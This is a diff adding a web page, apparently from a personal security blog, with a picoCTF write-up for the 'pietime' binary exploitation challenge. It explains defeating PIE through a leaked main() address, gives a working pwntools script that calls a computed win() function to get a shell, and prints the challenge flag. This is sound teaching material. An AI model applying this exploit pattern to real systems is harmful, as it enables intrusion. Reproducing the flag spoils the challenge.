@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pietime: PIE Bypass via Address Leak | S1GK1LL</title>
+    <meta name="description" content="Writeup for picoCTF pietime challenge - PIE bypass exploitation technique">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&family=Crimson+Text:ital,wght@0,400;0,600;1,400&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="bg-pattern">
+
+    <nav class="nav-container">
+        <div class="nav-inner">
+            <a href="/" class="logo">
+                <div class="logo-icon"><span>殺</span></div>
+                S1GK1LL
+            </a>
+            <button class="mobile-menu-btn" onclick="toggleMobileMenu()">
+                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M4 6h16M4 12h16M4 18h16"/>
+                </svg>
+            </button>
+            <ul class="nav-links">
+                <li><a href="/">Home</a></li>
+                <li><a href="/writeups/" class="active">Writeups</a></li>
+                <li><a href="/research.html">Research</a></li>
+                <li><a href="/tools.html">Tools</a></li>
+                <li><a href="/about.html">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <main>
+        <article class="writeup-content">
+            <header class="writeup-header">
+                <div class="writeup-meta">
+                    <span class="post-category">Pwn</span>
+                    <span class="post-date">March 8, 2026</span>
+                    <span style="color: var(--text-muted);">10 min read</span>
+                </div>
+                
+                <h1 class="writeup-title">pietime: PIE Bypass via Address Leak</h1>
+                
+                <div class="writeup-tags">
+                    <span class="writeup-tag">picoctf</span>
+                    <span class="writeup-tag">PIE</span>
+                    <span class="writeup-tag">address-leak</span>
+                    <span class="writeup-tag">ret2win</span>
+                </div>
+            </header>
+
+            <div class="writeup-body">
+                <h2>Challenge Overview</h2>
+                <p>
+                    <strong>pietime</strong> is a binary exploitation challenge from picoCTF that demonstrates a classic 
+                    <strong>Position Independent Executable (PIE)</strong> bypass technique. The binary leaks its own 
+                    base address through the main function, allowing us to defeat ASLR/PIE and calculate the location 
+                    of a hidden <code>win()</code> function.
+                </p>
+
+                <h2>Binary Analysis</h2>
+                <p>
+                    The challenge binary has the following characteristics:
+                </p>
+                <ul>
+                    <li><strong>PIE Enabled:</strong> Base address randomized at runtime</li>
+                    <li><strong>NX Enabled:</strong> Stack is non-executable</li>
+                    <li><strong>No Canary:</strong> Stack smashing protection disabled</li>
+                    <li><strong>Partial RELRO:</strong> GOT is writable</li>
+                </ul>
+
+                <div class="info-box">
+                    <div class="info-box-title">🔍 Key Vulnerability</div>
+                    <p>
+                        The binary prints the address of <code>main()</code> before reading user input. This information 
+                        leak allows us to calculate the PIE base address and locate any function in the binary, including 
+                        the <code>win()</code> function that spawns a shell.
+                    </p>
+                </div>
+
+                <h2>Exploitation Strategy</h2>
+                
+                <h3>Step 1: Leak the Address</h3>
+                <p>
+                    The binary leaks the address of <code>main()</code> in the format: 
+                    <code>"main is at: 0xADDRESS"</code>. We parse this leak using regex to extract the hexadecimal address.
+                </p>
+
+                <h3>Step 2: Calculate PIE Base</h3>
+                <p>
+                    Once we have the leaked <code>main()</code> address, we subtract the offset of <code>main</code> 
+                    from the binary base to get the <strong>PIE base address</strong>. From there, we can calculate 
+                    the absolute address of any function using its offset from the base.
+                </p>
+
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn red"></div>
+                        <div class="terminal-btn yellow"></div>
+                        <div class="terminal-btn green"></div>
+                        <span class="terminal-title">exploit.py</span>
+                    </div>
+                    <div class="terminal-body">
+<pre><span class="syntax-keyword">from</span> pwn <span class="syntax-keyword">import</span> *
+<span class="syntax-keyword">import</span> re
+
+p = remote(<span class="syntax-string">"rescued-float.picoctf.net"</span>, <span class="syntax-number">58034</span>)
+
+<span class="syntax-comment"># Receive the line containing the address leak</span>
+line = p.recvline()
+
+<span class="syntax-comment"># Extract the hexadecimal address using regex</span>
+match = re.search(<span class="syntax-string">rb'0x[0-9a-fA-F]+'</span>, line)
+<span class="syntax-keyword">if</span> <span class="syntax-keyword">not</span> match:
+    log.failure(<span class="syntax-string">"Address not found"</span>)
+    exit()
+
+<span class="syntax-comment"># Convert leaked address from bytes to integer</span>
+main_addr = <span class="syntax-built_in">int</span>(match.group(<span class="syntax-number">0</span>), <span class="syntax-number">16</span>)
+log.success(<span class="syntax-string">f"Main leak: {hex(main_addr)}"</span>)
+
+<span class="syntax-comment"># Calculate PIE base: leaked_main - main_offset</span>
+piebase = main_addr - <span class="syntax-number">0x133d</span>
+offset_win = <span class="syntax-number">0x12a7</span>
+
+<span class="syntax-comment"># Calculate absolute address of win()</span>
+win = piebase + offset_win
+log.success(<span class="syntax-string">f"Win address: {hex(win)}"</span>)
+
+<span class="syntax-comment"># Send the calculated win address to jump to it</span>
+p.sendlineafter(
+    <span class="syntax-string">b'Enter the address to jump to, ex => 0x12345: '</span>,
+    <span class="syntax-built_in">hex</span>(win).encode()
+)
+
+p.interactive()</pre>
+                    </div>
+                </div>
+
+                <h3>Step 3: Offset Calculation</h3>
+                <p>
+                    The offsets used in the exploit are determined through static analysis:
+                </p>
+                <ul>
+                    <li><code>main_offset = 0x133d</code> — Distance from PIE base to main()</li>
+                    <li><code>win_offset = 0x12a7</code> — Distance from PIE base to win()</li>
+                </ul>
+
+                <div class="info-box">
+                    <div class="info-box-title">💡 Pro Tip</div>
+                    <p>
+                        Use <code>readelf -s binary</code> or <code>objdump -d binary</code> to find function offsets 
+                        when PIE is enabled. Look for the offset from the start of the <code>.text</code> section.
+                    </p>
+                </div>
+
+                <h2>Why This Works</h2>
+                <p>
+                    PIE randomizes the base address of the binary but maintains consistent <strong>relative offsets</strong> 
+                    between functions. By leaking any function address, we obtain the slide value (randomization offset) 
+                    and can compute the location of any other function in the binary.
+                </p>
+
+                <h2>Mitigation Bypass</h2>
+                <p>
+                    This challenge demonstrates why <strong>information leaks are critical vulnerabilities</strong>. 
+                    Even with full ASLR and PIE enabled, a single address leak completely defeats the randomization, 
+                    reducing the exploit to a simple ret2win scenario.
+                </p>
+
+                <div class="flag-box">
+                    <div class="flag-label">Challenge Flag</div>
+                    <div class="flag-content" onclick="copyToClipboard('picoCTF{p13_5h0u1d_b3_r4nd0m1z3d_6f2ce0c0}')">
+                        picoCTF{p13_5h0u1d_b3_r4nd0m1z3d_6f2ce0c0}
+                    </div>
+                </div>
+
+                <h2>Key Takeaways</h2>
+                <ul>
+                    <li>Information leaks defeat ASLR/PIE mitigations</li>
+                    <li>Relative offsets remain constant even with PIE enabled</li>
+                    <li>Always audit programs for format string bugs or debug output that prints addresses</li>
+                    <li>Regex is your friend when parsing output from remote services</li>
+                </ul>
+            </div>
+
+            <div style="margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--border-subtle); display: flex; justify-content: space-between;">
+                <a href="/writeups/" style="color: var(--text-secondary); text-decoration: none;">← Back to Writeups</a>
+                <a href="/writeups/heap-house-of-spirit.html" style="color: var(--accent-gold); text-decoration: none;">Next: House of Spirit →</a>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>S1GK1LL</h4>
+                <p>Cybersecurity research and CTF archive</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2024 S1GK1LL | 殺</p>
+        </div>
+    </footer>
+
+    <script src="/js/main.js"></script>
+</body>
+</html>
